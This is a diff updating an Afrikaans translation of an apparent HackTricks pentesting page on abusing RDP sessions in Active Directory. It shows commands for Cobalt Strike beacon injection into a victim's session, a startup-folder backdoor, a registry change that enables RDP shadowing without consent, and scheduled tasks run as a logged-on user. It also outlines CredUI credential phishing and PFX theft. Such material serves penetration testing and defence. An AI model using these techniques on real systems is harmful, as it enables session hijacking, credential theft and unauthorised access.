@@ -4,9 +4,9 @@
 
 ## RDP Process Injection
 
-As die **external group** **RDP access** tot enige **computer** in die huidige domein het, kan 'n **attacker** **compromise that computer and wait for him**.
+As die **external group** **RDP access** tot enige **computer** in die huidige domein het, kan ’n **attacker** daardie **computer** kompromitteer en vir hom wag.
 
-Sodra daardie gebruiker via RDP toegang verkry het, kan die **attacker can pivot to that users session** en misbruik maak van die bevoegdhede daarvan in die eksterne domein.
+Sodra daardie gebruiker via RDP toegang verkry het, kan die **attacker** na daardie gebruiker se sessie **pivot** en sy toestemmings in die external domain misbruik.
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -30,13 +30,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Kyk na **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Kyk na **ander maniere om sessions met ander tools te steel** [**op hierdie bladsy.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-As 'n gebruiker via **RDP into a machine** toegang kry tot 'n masjien waar 'n **attacker** vir hom wag, sal die **attacker** in staat wees om **inject a beacon in the RDP session of the user**, en as die **victim mounted his drive** toe hy via RDP toegang gekry het, kan die **attacker** daarby toegang kry.
+As ’n gebruiker via **RDP toegang tot ’n masjien verkry** waar ’n **aanvaller** vir hom **wag**, sal die aanvaller in staat wees om **’n beacon in die gebruiker se RDP-session te injecteer**, en as die **slagoffer sy drive gemount het** toe hy via RDP toegang verkry het, kon die **aanvaller toegang daartoe verkry**.
 
-In hierdie geval kan jy net **compromise** die **victims** **original computer** deur 'n **backdoor** in die **statup folder** te skryf.
+In hierdie geval kon jy eenvoudig die **slagoffer** se **oorspronklike rekenaar compromise** deur ’n **backdoor** in die **statup folder** te skryf.
 ```bash
 # Wait til someone logs in:
 net logons
@@ -70,19 +70,19 @@ beacon> upload C:\Payloads\pivot.exe
 ```
 ## Shadow RDP
 
-As jy 'n **local admin** op 'n host is waar die slagoffer reeds 'n **active RDP session** het, mag jy dalk daardie desktop **view/control** sonder om die password te steel of LSASS te dump.
+As jy **local admin** is op ’n host waar die victim reeds ’n **active RDP session** het, kan jy moontlik daardie desktop **view/control sonder om die password te steel of LSASS te dump**.<sup>[[1]](#references)</sup>
 
-Dit hang af van die **Remote Desktop Services shadowing** policy wat gestoor is in:
+Dit hang af van die **Remote Desktop Services shadowing**-beleid wat gestoor word in:<sup>[[2]](#references)[[3]](#references)</sup>
 ```text
 HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 ```
 Interessante waardes:
 
-- `0`: Uitgeskakel
-- `1`: `EnableInputNotify` (beheer, gebruikersgoedkeuring vereis)
-- `2`: `EnableInputNoNotify` (beheer, **geen gebruikersgoedkeuring**)
-- `3`: `EnableNoInputNotify` (slegs-weergave, gebruikersgoedkeuring vereis)
-- `4`: `EnableNoInputNoNotify` (slegs-weergave, **geen gebruikersgoedkeuring**)
+- `0`: Gedeaktiveer
+- `1`: `EnableInputNotify` (beheer, gebruikerstoestemming vereis)
+- `2`: `EnableInputNoNotify` (beheer, **geen gebruikerstoestemming**)
+- `3`: `EnableNoInputNotify` (slegs besigtiging, gebruikerstoestemming vereis)
+- `4`: `EnableNoInputNoNotify` (slegs besigtiging, **geen gebruikerstoestemming**)
 ```cmd
 :: Check the policy
 reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
@@ -94,53 +94,53 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shado
 quser /server:<HOST>
 mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
 ```
-Dit is veral nuttig wanneer 'n geprivilegieerde gebruiker wat oor RDP verbind is, 'n ontgrendelde lessenaar, KeePass-sessie, MMC-konsol, browser session, of admin shell oopgelaat het.
+Dit is veral nuttig wanneer ’n bevoorregte gebruiker wat oor RDP gekoppel is, ’n ontsluite lessenaar, KeePass-sessie, MMC-konsole, browsersessie of admin shell oop en onbewaak gelaat het.
 
-## Scheduled Tasks as aangemelde gebruiker
+## Scheduled Tasks As Logged-On User
 
-As jy **local admin** is en die teiken gebruiker **op die oomblik aangemeld is**, kan Task Scheduler code begin **as daardie gebruiker sonder hul wagwoord**.
+As jy ’n **local admin** is en die teikengebruiker **tans aangemeld is**, kan Task Scheduler code **as daardie gebruiker sonder hul wagwoord** begin.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Dit verander die slagoffer se bestaande logon session in 'n execution primitive:
+Dit verander die slagoffer se bestaande aanmeldingsessie in ’n uitvoeringsmeganisme:
 ```cmd
 schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
 schtasks /run /S <HOST> /TN "Updater"
 ```
-Notes:
+Notas:
 
-- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
-- If the user **is logged on**, the task can reuse the existing logon context.
-- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.
+- As die gebruiker **nie aangemeld is nie**, vereis Windows gewoonlik die wagwoord om ’n taak te skep wat as daardie gebruiker loop.
+- As die gebruiker **aangemeld is**, kan die taak die bestaande aanmeldingskonteks hergebruik.
+- Dit is ’n praktiese manier om GUI-aksies uit te voer of binaries binne die slagoffer-sessie te begin sonder om aan LSASS te raak.
 
 ## CredUI Prompt Abuse From the Victim Session
 
-Once you can execute **inside the victim's interactive desktop** (for example via **Shadow RDP** or **a scheduled task running as that user**), you can display a **real Windows credential prompt** using CredUI APIs and harvest credentials entered by the victim.
+Sodra jy **binne die slagoffer se interaktiewe desktop** kan uitvoer (byvoorbeeld via **Shadow RDP** of **’n geskeduleerde taak wat as daardie gebruiker loop**), kan jy ’n **egte Windows credential prompt** met CredUI-API’s vertoon en credentials wat deur die slagoffer ingevoer word, harvest.<sup>[[1]](#references)</sup>
 
-Relevant APIs:
+Relevante API’s:
 
 - `CredUIPromptForWindowsCredentials`
 - `CredUnPackAuthenticationBuffer`
 
-Typical flow:
+Tipiese vloei:
 
-1. Spawn a binary in the victim session.
-2. Display a domain-authentication prompt that matches the current domain branding.
-3. Unpack the returned auth buffer.
-4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.
+1. Spawn ’n binary in die slagoffer-sessie.
+2. Vertoon ’n domein-authentication prompt wat by die huidige domein-branding pas.
+3. Unpack die teruggekeerde auth buffer.
+4. Valideer die verskafde credentials en hou opsioneel aan om prompts te vertoon totdat geldige credentials ingevoer word.
 
-This is useful for **on-host phishing** because the prompt is rendered by standard Windows APIs instead of a fake HTML form.
+Dit is nuttig vir **on-host phishing**, omdat die prompt deur standaard Windows-API’s gerender word in plaas van ’n vals HTML-vorm.
 
 ## Requesting a PFX In the Victim Context
 
-The same **scheduled-task-as-user** primitive can be used to request a **certificate/PFX as the logged-on victim**. That certificate can later be used for **AD authentication** as that user, avoiding password theft entirely.
+Dieselfde **scheduled-task-as-user** primitive kan gebruik word om ’n **certificate/PFX as the logged-on victim** aan te vra. Daardie certificate kan later vir **AD authentication** as daardie gebruiker gebruik word, wat password theft heeltemal vermy.<sup>[[1]](#references)[[5]](#references)</sup>
 
-High-level flow:
+Hoëvlak-vloei:
 
-1. Gain **local admin** on a host where the victim is logged on.
+1. Kry **local admin** op ’n host waarop die slagoffer aangemeld is.
 2. Run enrollment/export logic as the victim using a **scheduled task**.
-3. Export the resulting **PFX**.
-4. Use the PFX for PKINIT / certificate-based AD authentication.
+3. Export die resulterende **PFX**.
+4. Gebruik die PFX vir PKINIT / certificate-based AD authentication.
 
-See the AD CS pages for follow-up abuse:
+Sien die AD CS-bladsye vir verdere abuse:
 
 {{#ref}}
 ad-certificates/account-persistence.md
@@ -148,10 +148,10 @@ ad-certificates/account-persistence.md
 
 ## References
 
-- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
-- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
-- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
-- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
-- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
+- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
+- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
+- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
+- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
+- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
 
 {{#include ../../banners/hacktricks-training.md}}
